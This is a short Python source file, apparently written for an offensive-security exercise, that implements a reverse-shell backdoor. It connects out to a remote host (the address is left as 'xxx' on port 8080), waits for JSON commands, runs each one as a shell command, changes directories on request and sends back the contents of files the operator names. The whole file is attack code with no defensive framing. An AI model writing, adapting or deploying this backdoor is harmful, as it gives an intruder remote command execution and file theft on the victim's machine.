import socket
import subprocess
import json
import os
class MySocket:
	def __init__(self, ip, port):
		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.my_connection.connect((ip,port))




	def command_execution(self, command):
		return subprocess.check_output(command, shell=True)

	def json_send(self, data):
		json_data = json.dumps(data)
		self.my_connection.send(json_data)

	def json_receive(self):
		json_data=""
		while True:
			try:
				json_data = json_data + self.my_connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def command_cd(self,directory):
		os.chdir(directory)
		return "cd to "+ directory



	def get_file_conetent(self,path):
		with open(path,"rb") as my_file:
			return	my_file.read()







	def start_socket(self):

		while True:

			command = self.json_receive()
			if command[0] == "exit":
				self.my_connection.close()
				exit()
			elif command[0] == "cd" and len(command) >= 1:
				command_output = self.command_cd(command[1])
			elif command[0] == "download":
				command_output = self.get_file_conetent(command[1])

			else:
				command_output = self.command_execution(command)

			self.json_send(command_output)

		self.my_connection.close()

my_socketo = MySocket("xxx",8080)
my_socketo.start_socket()

